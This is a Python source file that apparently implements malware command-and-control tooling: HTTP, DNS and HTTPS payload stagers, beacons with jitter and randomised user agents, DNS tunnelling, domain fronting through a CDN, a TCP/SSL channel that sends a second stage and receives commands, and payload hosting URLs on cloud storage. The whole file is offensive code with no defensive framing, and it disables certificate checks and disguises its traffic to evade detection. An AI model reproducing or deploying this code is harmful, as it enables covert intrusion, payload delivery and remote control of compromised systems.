import struct
import socket
import ssl
import time
import random
from urllib.parse import urlparse

class StagedDelivery:
    def __init__(self, c2_host, c2_port):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.stage1_size = 0
        self.stage2_size = 0
        
    def stage1_http(self, uri="/update"):
        # minimal HTTP stager
        stage = b"GET %s HTTP/1.1\r\n" % uri.encode()
        stage += b"Host: %s:%d\r\n" % (self.c2_host.encode(), self.c2_port)
        stage += b"User-Agent: Mozilla/5.0\r\n"
        stage += b"Connection: close\r\n\r\n"
        return stage
        
    def stage1_dns(self, domain="update.com"):
        # DNS TXT record stager
        query = struct.pack("!H", random.randint(1, 65535))  # ID
        query += b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        query += b"\x06" + b"update" + b"\x03" + b"com" + b"\x00"
        query += b"\x00\x10\x00\x01"  # TXT query
        return query
        
    def stage1_https(self, uri="/check"):
        # HTTPS stager with jitter
        jitter = random.uniform(0.8, 1.2)
        time.sleep(jitter * 2)
        
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        return self.stage1_http(uri)

class BeaconGen:
    def __init__(self, c2_url, interval=300, jitter=0.2):
        self.c2_url = c2_url
        self.interval = interval
        self.jitter = jitter
        self.session_id = struct.pack("<I", random.randint(0, 0xffffffff))
        
    def http_beacon(self, data=b""):
        # HTTP beacon with random jitter
        jitter = random.uniform(1 - self.jitter, 1 + self.jitter)
        sleep_time = self.interval * jitter
        
        beacon = {
            'method': 'POST',
            'url': self.c2_url,
            'headers': {
                'User-Agent': self._random_ua(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': f"SESSION={self.session_id.hex()}"
            },
            'data': data
        }
        return beacon
        
    def dns_beacon(self, data):
        # DNS tunnel beacon
        encoded = self._encode_dns(data)
        query = f"{encoded}.tunnel.com"
        return query
        
    def https_beacon(self):
        # HTTPS beacon with domain fronting
        front_domain = "cdn.cloudflare.com"
        real_domain = urlparse(self.c2_url).netloc
        
        beacon = self.http_beacon()
        beacon['headers']['Host'] = front_domain
        return beacon
        
    def _random_ua(self):
        uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]
        return random.choice(uas)
        
    def _encode_dns(self, data):
        # base32 encode for DNS
        import base64
        encoded = base64.b32encode(data).decode().rstrip('=')
        return encoded.lower()

class C2Comms:
    def __init__(self, c2_config):
        self.config = c2_config
        self.socket = None
        
    def connect_tcp(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.config['host'], self.config['port']))
        
    def connect_ssl(self):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        self.socket = context.wrap_socket(
            socket.socket(socket.AF_INET, socket.SOCK_STREAM),
            server_hostname=self.config['host']
        )
        self.socket.connect((self.config['host'], self.config['port']))
        
    def send_stage2(self, data):
        if self.config['protocol'] == 'https':
            self.connect_ssl()
        else:
            self.connect_tcp()
            
        # send length first
        self.socket.send(struct.pack("<I", len(data)))
        self.socket.send(data)
        
    def receive_command(self):
        # receive command from C2
        try:
            length = struct.unpack("<I", self.socket.recv(4))[0]
            return self.socket.recv(length)
        except:
            return b""

class DomainFronting:
    def __init__(self, front_domain, real_domain):
        self.front = front_domain
        self.real = real_domain
        
    def create_request(self, path="/"):
        req = f"GET {path} HTTP/1.1\r\n"
        req += f"Host: {self.front}\r\n"
        req += "User-Agent: Mozilla/5.0\r\n"
        req += f"X-Real-Host: {self.real}\r\n"
        req += "Connection: close\r\n\r\n"
        return req.encode()

class CDNProxy:
    def __init__(self, cdn_list):
        self.cdns = cdn_list
        
    def rotate_endpoint(self):
        return random.choice(self.cdns)
        
    def create_payload_url(self, payload_id):
        cdn = self.rotate_endpoint()
        return f"https://{cdn}/static/{payload_id}"

class CloudC2:
    def __init__(self, provider="aws"):
        self.provider = provider
        
    def s3_delivery(self, bucket, key):
        url = f"https://{bucket}.s3.amazonaws.com/{key}"
        return url
        
    def azure_blob(self, account, container, blob):
        url = f"https://{account}.blob.core.windows.net/{container}/{blob}"
        return url
        
    def gcp_storage(self, bucket, object_name):
        url = f"https://storage.googleapis.com/{bucket}/{object_name}"
        return url
